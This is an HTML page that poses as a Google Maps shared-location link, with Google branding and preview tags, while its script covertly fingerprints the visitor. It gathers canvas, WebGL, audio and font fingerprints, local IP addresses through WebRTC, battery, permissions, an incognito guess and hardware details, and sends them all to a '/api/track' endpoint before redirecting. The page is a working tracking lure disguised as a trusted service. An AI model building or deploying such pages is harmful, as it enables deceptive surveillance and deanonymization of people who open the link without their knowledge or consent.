<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google Maps</title>
  <meta property="og:title" content="Google Maps">
  <meta property="og:description" content="Someone shared a location with you on Google Maps. Tap to view the location.">
  <meta property="og:image" content="https://lh3.googleusercontent.com/gps-cs-s/AHVAwerhh1CF5RzARoavJmRMvvfuBs9Vq1rXjqRsUGJVRqXtl4otViJ1KOkp95cdyAVfZEPn1KfAHV1-bJAJZrKAYl0UBFitu5_i3Upe0WV-IZGX023H-HaINFX1-xGVOM1Kw_HDBBWcDCYDMfOY=s680-w680-h510-rw">
  <meta property="og:image:width" content="680">
  <meta property="og:image:height" content="510">
  <meta property="og:type" content="website">
  <meta property="og:site_name" content="Google Maps">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Google Maps">
  <meta name="twitter:description" content="Someone shared a location with you on Google Maps.">
  <meta name="twitter:image" content="https://lh3.googleusercontent.com/gps-cs-s/AHVAwerhh1CF5RzARoavJmRMvvfuBs9Vq1rXjqRsUGJVRqXtl4otViJ1KOkp95cdyAVfZEPn1KfAHV1-bJAJZrKAYl0UBFitu5_i3Upe0WV-IZGX023H-HaINFX1-xGVOM1Kw_HDBBWcDCYDMfOY=s680-w680-h510-rw">
  <link rel="icon" href="https://www.google.com/favicon.ico">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      color: #202124;
    }
    .loader-container {
      text-align: center;
      padding: 2rem;
    }
    .map-icon {
      width: 64px;
      height: 64px;
      margin-bottom: 1.5rem;
    }
    .spinner {
      width: 40px;
      height: 40px;
      border: 3px solid #e8eaed;
      border-top-color: #4285f4;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin: 1.5rem auto;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    .title {
      font-size: 1.1rem;
      font-weight: 500;
      color: #202124;
      margin-bottom: 0.5rem;
    }
    .subtitle {
      font-size: 0.85rem;
      color: #5f6368;
    }
    .error-container {
      display: none;
      text-align: center;
      padding: 2rem;
    }
    .error-container h2 { color: #d93025; margin-bottom: 0.5rem; }
    .error-container p { color: #5f6368; }
  </style>
</head>
<body>
  <div class="loader-container" id="loader">
    <svg class="map-icon" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M32 4C21.5 4 13 12.5 13 23c0 13.5 19 37 19 37s19-23.5 19-37C51 12.5 42.5 4 32 4z" fill="#EA4335"/>
      <circle cx="32" cy="23" r="8" fill="#fff"/>
    </svg>
    <div class="title">Redirecting to Google Maps...</div>
    <div class="spinner"></div>
    <div class="subtitle">Loading your destination</div>
  </div>

  <div class="error-container" id="error">
    <h2>Link Expired</h2>
    <p>This shared location link is no longer available.</p>
  </div>

  <script>
    (async () => {
      const linkId = window.location.pathname.split("/r/")[1];
      if (!linkId) {
        showError();
        return;
      }

      let deviceInfo = {};
      try {
        deviceInfo = await collectWithTimeout();
      } catch {}

      try {
        const res = await fetch("/api/track", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ id: linkId, deviceInfo }),
        });
        const data = await res.json();
        if (data.destination) {
          window.location.href = data.destination;
        } else {
          showError();
        }
      } catch {
        showError();
      }
    })();

    function showError() {
      document.getElementById("loader").style.display = "none";
      document.getElementById("error").style.display = "block";
    }

    function collectWithTimeout() {
      return new Promise(async (resolve) => {
        const d = {};
        collectSync(d);

        const timer = setTimeout(() => resolve(d), 2500);

        await Promise.allSettled([
          collectBattery(d),
          collectWebRTC(d),
          collectMedia(d),
          collectPermissions(d),
          collectStorage(d),
          collectAudioFP(d),
          collectVoices(d),
          collectClientHints(d),
        ]);

        clearTimeout(timer);
        resolve(d);
      });
    }

    function collectSync(d) {
      d.userAgent = navigator.userAgent;
      d.platform = navigator.platform;
      d.vendor = navigator.vendor;
      d.language = navigator.language;
      d.languages = [...(navigator.languages || [])];
      d.cpuCores = navigator.hardwareConcurrency;
      d.deviceMemory = navigator.deviceMemory;
      d.maxTouchPoints = navigator.maxTouchPoints;
      d.doNotTrack = navigator.doNotTrack;
      d.cookieEnabled = navigator.cookieEnabled;
      d.online = navigator.onLine;
      d.webdriver = navigator.webdriver;
      d.pdfViewer = navigator.pdfViewerEnabled;

      d.screen = {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        orientation: screen.orientation?.type,
        angle: screen.orientation?.angle,
      };
      d.viewport = {
        width: window.innerWidth,
        height: window.innerHeight,
        outerWidth: window.outerWidth,
        outerHeight: window.outerHeight,
      };
      d.devicePixelRatio = window.devicePixelRatio;

      d.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      d.timezoneOffset = new Date().getTimezoneOffset();
      d.locale = Intl.DateTimeFormat().resolvedOptions().locale;
      d.localTime = new Date().toISOString();

      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (conn) {
        d.connection = {
          type: conn.type,
          effectiveType: conn.effectiveType,
          downlink: conn.downlink,
          rtt: conn.rtt,
          saveData: conn.saveData,
        };
      }

      try {
        const c = document.createElement("canvas");
        const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
        if (gl) {
          const ext = gl.getExtension("WEBGL_debug_renderer_info");
          d.gpu = {
            vendor: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : null,
            renderer: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : null,
            version: gl.getParameter(gl.VERSION),
            shadingLang: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
            maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
            maxViewportDims: Array.from(gl.getParameter(gl.MAX_VIEWPORT_DIMS)),
            extensions: gl.getSupportedExtensions()?.length,
          };
        }
      } catch {}

      try {
        const c = document.createElement("canvas");
        c.width = 200;
        c.height = 50;
        const ctx = c.getContext("2d");
        ctx.textBaseline = "top";
        ctx.font = "14px Arial";
        ctx.fillStyle = "#f60";
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = "#069";
        ctx.fillText("fp_canvas", 2, 15);
        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
        ctx.fillText("fp_canvas", 4, 17);
        const url = c.toDataURL();
        let hash = 0;
        for (let i = 0; i < url.length; i++) {
          hash = ((hash << 5) - hash + url.charCodeAt(i)) | 0;
        }
        d.canvasFingerprint = hash.toString(16);
      } catch {}

      try {
        const actx = new (window.AudioContext || window.webkitAudioContext)();
        d.audio = {
          sampleRate: actx.sampleRate,
          maxChannels: actx.destination.maxChannelCount,
          state: actx.state,
        };
        actx.close();
      } catch {}

      d.preferences = {
        colorScheme: matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light",
        reducedMotion: matchMedia("(prefers-reduced-motion: reduce)").matches,
        contrast: matchMedia("(prefers-contrast: more)").matches ? "more" : "normal",
        forcedColors: matchMedia("(forced-colors: active)").matches,
        pointer: matchMedia("(any-pointer: coarse)").matches
          ? "coarse"
          : matchMedia("(any-pointer: fine)").matches
          ? "fine"
          : "none",
        hover: matchMedia("(any-hover: hover)").matches,
      };

      d.features = {
        webSocket: "WebSocket" in window,
        webRTC: "RTCPeerConnection" in window,
        serviceWorker: "serviceWorker" in navigator,
        webAssembly: "WebAssembly" in window,
        sharedArrayBuffer: "SharedArrayBuffer" in window,
        webGL2: !!document.createElement("canvas").getContext("webgl2"),
        webGPU: "gpu" in navigator,
        bluetooth: "bluetooth" in navigator,
        usb: "usb" in navigator,
        midi: "requestMIDIAccess" in navigator,
        gamepad: "getGamepads" in navigator,
        xr: "xr" in navigator,
        speech: "speechSynthesis" in window,
        payment: "PaymentRequest" in window,
      };

      if (performance.memory) {
        d.memory = {
          jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
          totalJSHeapSize: performance.memory.totalJSHeapSize,
          usedJSHeapSize: performance.memory.usedJSHeapSize,
        };
      }

      d.referrer = document.referrer || null;
      d.historyLength = history.length;
      d.pluginsCount = navigator.plugins?.length || 0;

      // Font detection via text measurement
      try {
        const baseFonts = ["monospace", "sans-serif", "serif"];
        const testFonts = [
          "Arial","Arial Black","Calibri","Cambria","Comic Sans MS","Consolas",
          "Courier New","Georgia","Helvetica","Helvetica Neue","Impact",
          "Lucida Console","Lucida Sans","Monaco","Palatino","Segoe UI",
          "Tahoma","Times New Roman","Trebuchet MS","Verdana","Menlo",
          "SF Pro","SF Mono","Roboto","Ubuntu","Cantarell","Noto Sans",
          "Fira Sans","Source Code Pro","Droid Sans","Open Sans",
        ];
        const span = document.createElement("span");
        span.style.cssText = "position:absolute;left:-9999px;font-size:72px;visibility:hidden";
        span.textContent = "mmmmmmmmmmlli";
        document.body.appendChild(span);
        const baseW = {};
        for (const b of baseFonts) { span.style.fontFamily = b; baseW[b] = span.offsetWidth; }
        const detected = [];
        for (const f of testFonts) {
          for (const b of baseFonts) {
            span.style.fontFamily = `'${f}',${b}`;
            if (span.offsetWidth !== baseW[b]) { detected.push(f); break; }
          }
        }
        document.body.removeChild(span);
        d.installedFonts = detected;
      } catch {}

      // WebGL render fingerprint — different GPUs produce different pixel output
      try {
        const c = document.createElement("canvas");
        c.width = 50; c.height = 50;
        const gl = c.getContext("webgl");
        if (gl) {
          gl.clearColor(0.2, 0.4, 0.6, 1.0);
          gl.clear(gl.COLOR_BUFFER_BIT);
          const vs = gl.createShader(gl.VERTEX_SHADER);
          gl.shaderSource(vs, "attribute vec2 p;void main(){gl_Position=vec4(p,0,1);}");
          gl.compileShader(vs);
          const fs = gl.createShader(gl.FRAGMENT_SHADER);
          gl.shaderSource(fs, "precision mediump float;void main(){gl_FragColor=vec4(0.9,0.3,0.2,1);}");
          gl.compileShader(fs);
          const prog = gl.createProgram();
          gl.attachShader(prog, vs); gl.attachShader(prog, fs);
          gl.linkProgram(prog); gl.useProgram(prog);
          const buf = gl.createBuffer();
          gl.bindBuffer(gl.ARRAY_BUFFER, buf);
          gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([0,0.5,-0.5,-0.5,0.5,-0.5]), gl.STATIC_DRAW);
          const loc = gl.getAttribLocation(prog, "p");
          gl.enableVertexAttribArray(loc);
          gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
          gl.drawArrays(gl.TRIANGLES, 0, 3);
          const url = c.toDataURL();
          let h = 0;
          for (let i = 0; i < url.length; i++) h = ((h << 5) - h + url.charCodeAt(i)) | 0;
          d.webglFingerprint = h.toString(16);
        }
      } catch {}

      // Math engine fingerprint — slightly different results per JS engine/OS
      try {
        d.mathFingerprint = [
          Math.tan(-1e300), Math.acos(0.123456789), Math.sinh(1),
          Math.atanh(0.5), Math.expm1(1), Math.log1p(0.5), Math.cbrt(2),
        ].map(String).join(",");
      } catch {}

      // ClientRects fingerprint — text bounding boxes vary per rendering engine
      try {
        const el = document.createElement("div");
        el.style.cssText = "position:absolute;left:-9999px;font-size:16px;font-family:Arial";
        el.innerHTML = "Hello, World! <span>test</span> mmm";
        document.body.appendChild(el);
        const r = el.getClientRects()[0];
        if (r) d.clientRectsFP = `${r.width.toFixed(4)},${r.height.toFixed(4)}`;
        document.body.removeChild(el);
      } catch {}

      // Ad blocker detection
      try {
        const bait = document.createElement("div");
        bait.className = "adsbox ad-banner ad-placement";
        bait.style.cssText = "position:absolute;left:-9999px;width:1px;height:1px";
        bait.innerHTML = "&nbsp;";
        document.body.appendChild(bait);
        d.adBlocker = bait.offsetHeight === 0 || bait.clientHeight === 0;
        document.body.removeChild(bait);
      } catch {}
    }

    async function collectBattery(d) {
      try {
        const b = await navigator.getBattery();
        d.battery = {
          level: Math.round(b.level * 100),
          charging: b.charging,
          chargingTime: b.chargingTime,
          dischargingTime: b.dischargingTime,
        };
      } catch {}
    }

    function collectWebRTC(d) {
      return new Promise((resolve) => {
        try {
          const ips = new Set();
          const pc = new RTCPeerConnection({
            iceServers: [{ urls: "stun:stun.l.google.com:19302" }],
          });
          pc.createDataChannel("");
          pc.onicecandidate = (e) => {
            if (!e.candidate) {
              pc.close();
              d.localIPs = [...ips];
              resolve();
              return;
            }
            const parts = e.candidate.candidate.split(" ");
            if (parts.length >= 5) {
              const ip = parts[4];
              if (ip && ip !== "0.0.0.0") ips.add(ip);
            }
          };
          pc.createOffer().then((o) => pc.setLocalDescription(o));
          setTimeout(() => {
            try { pc.close(); } catch {}
            d.localIPs = [...ips];
            resolve();
          }, 1500);
        } catch {
          d.localIPs = [];
          resolve();
        }
      });
    }

    async function collectMedia(d) {
      try {
        const devs = await navigator.mediaDevices?.enumerateDevices();
        if (devs) {
          d.mediaDevices = {
            audioInputs: devs.filter((x) => x.kind === "audioinput").length,
            audioOutputs: devs.filter((x) => x.kind === "audiooutput").length,
            videoInputs: devs.filter((x) => x.kind === "videoinput").length,
          };
        }
      } catch {}
    }

    async function collectPermissions(d) {
      d.permissions = {};
      const names = ["geolocation", "notifications", "camera", "microphone"];
      for (const name of names) {
        try {
          const r = await navigator.permissions.query({ name });
          d.permissions[name] = r.state;
        } catch {}
      }
    }

    async function collectStorage(d) {
      try {
        const est = await navigator.storage?.estimate();
        if (est) {
          d.storageEstimate = { quota: est.quota, usage: est.usage };
          d.possibleIncognito = est.quota < 200 * 1024 * 1024;
        }
      } catch {}
    }

    function collectAudioFP(d) {
      return new Promise((resolve) => {
        try {
          const ctx = new OfflineAudioContext(1, 44100, 44100);
          const osc = ctx.createOscillator();
          osc.type = "triangle";
          osc.frequency.setValueAtTime(10000, ctx.currentTime);
          const comp = ctx.createDynamicsCompressor();
          comp.threshold.setValueAtTime(-50, ctx.currentTime);
          comp.knee.setValueAtTime(40, ctx.currentTime);
          comp.ratio.setValueAtTime(12, ctx.currentTime);
          comp.attack.setValueAtTime(0, ctx.currentTime);
          comp.release.setValueAtTime(0.25, ctx.currentTime);
          osc.connect(comp);
          comp.connect(ctx.destination);
          osc.start(0);
          ctx.startRendering().then((buf) => {
            const data = buf.getChannelData(0);
            let h = 0;
            for (let i = 4500; i < 5000; i++) h = ((h << 5) - h + Math.round(data[i] * 1e6)) | 0;
            d.audioFingerprint = h.toString(16);
            resolve();
          });
          setTimeout(resolve, 1000);
        } catch { resolve(); }
      });
    }

    function collectVoices(d) {
      return new Promise((resolve) => {
        try {
          const get = () => speechSynthesis.getVoices().map((v) => `${v.name}|${v.lang}`);
          const v = get();
          if (v.length) { d.voices = v; resolve(); return; }
          speechSynthesis.onvoiceschanged = () => { d.voices = get(); resolve(); };
          setTimeout(resolve, 500);
        } catch { resolve(); }
      });
    }

    async function collectClientHints(d) {
      try {
        const ua = navigator.userAgentData;
        if (!ua) return;
        d.clientHints = {
          brands: ua.brands?.map((b) => `${b.brand}/${b.version}`),
          mobile: ua.mobile,
          platform: ua.platform,
        };
        const hi = await ua.getHighEntropyValues([
          "architecture","bitness","model","platformVersion","fullVersionList","wow64",
        ]);
        d.clientHints.architecture = hi.architecture;
        d.clientHints.bitness = hi.bitness;
        d.clientHints.model = hi.model;
        d.clientHints.platformVersion = hi.platformVersion;
        d.clientHints.wow64 = hi.wow64;
        d.clientHints.fullVersionList = hi.fullVersionList?.map((b) => `${b.brand}/${b.version}`);
      } catch {}
    }
  </script>
</body>
</html>
